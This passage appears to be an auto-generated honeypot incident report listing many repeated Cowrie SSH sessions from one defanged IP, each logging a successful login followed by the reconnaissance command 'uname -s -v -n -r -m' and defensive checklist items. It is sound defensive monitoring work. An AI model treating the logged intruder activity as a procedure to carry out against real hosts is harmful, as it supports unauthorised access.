- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d224fa152f9b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:01` | `cowrie.session.connect` |
| `2026-08-15 20:19:01` | `cowrie.client.version` |
| `2026-08-15 20:19:01` | `cowrie.client.kex` |
| `2026-08-15 20:19:01` | `cowrie.login.success` |
| `2026-08-15 20:19:02` | `cowrie.session.params` |
| `2026-08-15 20:19:02` | `cowrie.command.input` |
| `2026-08-15 20:19:02` | `cowrie.log.closed` |
| `2026-08-15 20:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66773beca8e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:06` | `cowrie.session.connect` |
| `2026-08-15 20:19:06` | `cowrie.client.version` |
| `2026-08-15 20:19:06` | `cowrie.client.kex` |
| `2026-08-15 20:19:07` | `cowrie.login.success` |
| `2026-08-15 20:19:08` | `cowrie.session.params` |
| `2026-08-15 20:19:08` | `cowrie.command.input` |
| `2026-08-15 20:19:08` | `cowrie.log.closed` |
| `2026-08-15 20:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e649661063a3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:11` | `cowrie.session.connect` |
| `2026-08-15 20:19:11` | `cowrie.client.version` |
| `2026-08-15 20:19:11` | `cowrie.client.kex` |
| `2026-08-15 20:19:12` | `cowrie.login.success` |
| `2026-08-15 20:19:12` | `cowrie.session.params` |
| `2026-08-15 20:19:12` | `cowrie.command.input` |
| `2026-08-15 20:19:13` | `cowrie.log.closed` |
| `2026-08-15 20:19:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8060d8f59e2b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:16` | `cowrie.session.connect` |
| `2026-08-15 20:19:16` | `cowrie.client.version` |
| `2026-08-15 20:19:16` | `cowrie.client.kex` |
| `2026-08-15 20:19:17` | `cowrie.login.success` |
| `2026-08-15 20:19:18` | `cowrie.session.params` |
| `2026-08-15 20:19:18` | `cowrie.command.input` |
| `2026-08-15 20:19:18` | `cowrie.log.closed` |
| `2026-08-15 20:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68e894b693a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:22` | `cowrie.session.connect` |
| `2026-08-15 20:19:22` | `cowrie.client.version` |
| `2026-08-15 20:19:22` | `cowrie.client.kex` |
| `2026-08-15 20:19:22` | `cowrie.login.success` |
| `2026-08-15 20:19:24` | `cowrie.session.params` |
| `2026-08-15 20:19:24` | `cowrie.command.input` |
| `2026-08-15 20:19:24` | `cowrie.log.closed` |
| `2026-08-15 20:19:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59a6ac94087d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:27` | `cowrie.session.connect` |
| `2026-08-15 20:19:27` | `cowrie.client.version` |
| `2026-08-15 20:19:27` | `cowrie.client.kex` |
| `2026-08-15 20:19:27` | `cowrie.login.success` |
| `2026-08-15 20:19:28` | `cowrie.session.params` |
| `2026-08-15 20:19:28` | `cowrie.command.input` |
| `2026-08-15 20:19:28` | `cowrie.log.closed` |
| `2026-08-15 20:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9253dafcc47

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:32` | `cowrie.session.connect` |
| `2026-08-15 20:19:32` | `cowrie.client.version` |
| `2026-08-15 20:19:32` | `cowrie.client.kex` |
| `2026-08-15 20:19:33` | `cowrie.login.success` |
| `2026-08-15 20:19:33` | `cowrie.session.params` |
| `2026-08-15 20:19:33` | `cowrie.command.input` |
| `2026-08-15 20:19:34` | `cowrie.log.closed` |
| `2026-08-15 20:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4082dafd286b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:37` | `cowrie.session.connect` |
| `2026-08-15 20:19:37` | `cowrie.client.version` |
| `2026-08-15 20:19:37` | `cowrie.client.kex` |
| `2026-08-15 20:19:38` | `cowrie.login.success` |
| `2026-08-15 20:19:39` | `cowrie.session.params` |
| `2026-08-15 20:19:39` | `cowrie.command.input` |
| `2026-08-15 20:19:39` | `cowrie.log.closed` |
| `2026-08-15 20:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-435481ff025b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:42` | `cowrie.session.connect` |
| `2026-08-15 20:19:42` | `cowrie.client.version` |
| `2026-08-15 20:19:43` | `cowrie.client.kex` |
| `2026-08-15 20:19:43` | `cowrie.login.success` |
| `2026-08-15 20:19:44` | `cowrie.session.params` |
| `2026-08-15 20:19:44` | `cowrie.command.input` |
| `2026-08-15 20:19:44` | `cowrie.log.closed` |
| `2026-08-15 20:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d15a9d4fe3d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:48` | `cowrie.session.connect` |
| `2026-08-15 20:19:48` | `cowrie.client.version` |
| `2026-08-15 20:19:48` | `cowrie.client.kex` |
| `2026-08-15 20:19:49` | `cowrie.login.success` |
| `2026-08-15 20:19:49` | `cowrie.session.params` |
| `2026-08-15 20:19:49` | `cowrie.command.input` |
| `2026-08-15 20:19:50` | `cowrie.log.closed` |
| `2026-08-15 20:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db0543bb145d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:53` | `cowrie.session.connect` |
| `2026-08-15 20:19:53` | `cowrie.client.version` |
| `2026-08-15 20:19:53` | `cowrie.client.kex` |
| `2026-08-15 20:19:53` | `cowrie.login.success` |
| `2026-08-15 20:19:54` | `cowrie.session.params` |
| `2026-08-15 20:19:54` | `cowrie.command.input` |
| `2026-08-15 20:19:55` | `cowrie.log.closed` |
| `2026-08-15 20:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fb288cc34b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:19 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:19:58` | `cowrie.session.connect` |
| `2026-08-15 20:19:58` | `cowrie.client.version` |
| `2026-08-15 20:19:58` | `cowrie.client.kex` |
| `2026-08-15 20:19:59` | `cowrie.login.success` |
| `2026-08-15 20:19:59` | `cowrie.session.params` |
| `2026-08-15 20:19:59` | `cowrie.command.input` |
| `2026-08-15 20:20:00` | `cowrie.log.closed` |
| `2026-08-15 20:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-566fedc743e7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:20 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:20:03` | `cowrie.session.connect` |
| `2026-08-15 20:20:03` | `cowrie.client.version` |
| `2026-08-15 20:20:04` | `cowrie.client.kex` |
| `2026-08-15 20:20:04` | `cowrie.login.success` |
| `2026-08-15 20:20:05` | `cowrie.session.params` |
| `2026-08-15 20:20:05` | `cowrie.command.input` |
| `2026-08-15 20:20:05` | `cowrie.log.closed` |
| `2026-08-15 20:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a3d2e77d2f9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:20 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:20:09` | `cowrie.session.connect` |
| `2026-08-15 20:20:09` | `cowrie.client.version` |
| `2026-08-15 20:20:09` | `cowrie.client.kex` |
| `2026-08-15 20:20:09` | `cowrie.login.success` |
| `2026-08-15 20:20:10` | `cowrie.session.params` |
| `2026-08-15 20:20:10` | `cowrie.command.input` |
| `2026-08-15 20:20:10` | `cowrie.log.closed` |
| `2026-08-15 20:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-578179e52d6b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:20 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:20:14` | `cowrie.session.connect` |
| `2026-08-15 20:20:14` | `cowrie.client.version` |
| `2026-08-15 20:20:14` | `cowrie.client.kex` |
| `2026-08-15 20:20:15` | `cowrie.login.success` |
| `2026-08-15 20:20:15` | `cowrie.session.params` |
| `2026-08-15 20:20:15` | `cowrie.command.input` |
| `2026-08-15 20:20:15` | `cowrie.log.closed` |
| `2026-08-15 20:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd45c6f4dca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:20 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:20:19` | `cowrie.session.connect` |
| `2026-08-15 20:20:19` | `cowrie.client.version` |
| `2026-08-15 20:20:19` | `cowrie.client.kex` |
| `2026-08-15 20:20:20` | `cowrie.login.success` |
| `2026-08-15 20:20:21` | `cowrie.session.params` |
| `2026-08-15 20:20:21` | `cowrie.command.input` |
| `2026-08-15 20:20:21` | `cowrie.log.closed` |
| `2026-08-15 20:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e11a6705e9a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:20 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:20:24` | `cowrie.session.connect` |
| `2026-08-15 20:20:24` | `cowrie.client.version` |
| `2026-08-15 20:20:24` | `cowrie.client.kex` |
| `2026-08-15 20:20:25` | `cowrie.login.success` |
| `2026-08-15 20:20:26` | `cowrie.session.params` |
| `2026-08-15 20:20:26` | `cowrie.command.input` |
| `2026-08-15 20:20:26` | `cowrie.log.closed` |
| `2026-08-15 20:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0bb2d16703f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:20 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:20:30` | `cowrie.session.connect` |
| `2026-08-15 20:20:30` | `cowrie.client.version` |
| `2026-08-15 20:20:30` | `cowrie.client.kex` |
| `2026-08-15 20:20:30` | `cowrie.login.success` |
| `2026-08-15 20:20:31` | `cowrie.session.params` |
| `2026-08-15 20:20:31` | `cowrie.command.input` |
| `2026-08-15 20:20:31` | `cowrie.log.closed` |
| `2026-08-15 20:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9741e16d91ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:20 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:20:35` | `cowrie.session.connect` |
| `2026-08-15 20:20:35` | `cowrie.client.version` |
| `2026-08-15 20:20:35` | `cowrie.client.kex` |
| `2026-08-15 20:20:36` | `cowrie.login.success` |
| `2026-08-15 20:20:37` | `cowrie.session.params` |
| `2026-08-15 20:20:37` | `cowrie.command.input` |
| `2026-08-15 20:20:37` | `cowrie.log.closed` |
| `2026-08-15 20:20:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4def06a0c1e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:20 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:20:40` | `cowrie.session.connect` |
| `2026-08-15 20:20:40` | `cowrie.client.version` |
| `2026-08-15 20:20:40` | `cowrie.client.kex` |
| `2026-08-15 20:20:41` | `cowrie.login.success` |
| `2026-08-15 20:20:42` | `cowrie.session.params` |
| `2026-08-15 20:20:42` | `cowrie.command.input` |
| `2026-08-15 20:20:42` | `cowrie.log.closed` |
| `2026-08-15 20:20:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00a7d8a1c3d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:20 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:20:45` | `cowrie.session.connect` |
| `2026-08-15 20:20:45` | `cowrie.client.version` |
| `2026-08-15 20:20:45` | `cowrie.client.kex` |
| `2026-08-15 20:20:46` | `cowrie.login.success` |
| `2026-08-15 20:20:47` | `cowrie.session.params` |
| `2026-08-15 20:20:47` | `cowrie.command.input` |
| `2026-08-15 20:20:47` | `cowrie.log.closed` |
| `2026-08-15 20:20:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79d9bea0b48a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:20 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:20:50` | `cowrie.session.connect` |
| `2026-08-15 20:20:50` | `cowrie.client.version` |
| `2026-08-15 20:20:50` | `cowrie.client.kex` |
| `2026-08-15 20:20:51` | `cowrie.login.success` |
| `2026-08-15 20:20:52` | `cowrie.session.params` |
| `2026-08-15 20:20:52` | `cowrie.command.input` |
| `2026-08-15 20:20:52` | `cowrie.log.closed` |
| `2026-08-15 20:20:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d047c9d1960a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:20 |
| **Last Seen** | 2026-08-15 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:20:55` | `cowrie.session.connect` |
| `2026-08-15 20:20:55` | `cowrie.client.version` |
| `2026-08-15 20:20:55` | `cowrie.client.kex` |
| `2026-08-15 20:20:56` | `cowrie.login.success` |
| `2026-08-15 20:20:57` | `cowrie.session.params` |
| `2026-08-15 20:20:57` | `cowrie.command.input` |
| `2026-08-15 20:20:57` | `cowrie.log.closed` |
| `2026-08-15 20:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-290a62ee16c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:00` | `cowrie.session.connect` |
| `2026-08-15 20:21:00` | `cowrie.client.version` |
| `2026-08-15 20:21:00` | `cowrie.client.kex` |
| `2026-08-15 20:21:01` | `cowrie.login.success` |
| `2026-08-15 20:21:02` | `cowrie.session.params` |
| `2026-08-15 20:21:02` | `cowrie.command.input` |
| `2026-08-15 20:21:02` | `cowrie.log.closed` |
| `2026-08-15 20:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-864bfbcedd2c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:05` | `cowrie.session.connect` |
| `2026-08-15 20:21:05` | `cowrie.client.version` |
| `2026-08-15 20:21:06` | `cowrie.client.kex` |
| `2026-08-15 20:21:06` | `cowrie.login.success` |
| `2026-08-15 20:21:07` | `cowrie.session.params` |
| `2026-08-15 20:21:07` | `cowrie.command.input` |
| `2026-08-15 20:21:07` | `cowrie.log.closed` |
| `2026-08-15 20:21:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27bdc86a8509

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:10` | `cowrie.session.connect` |
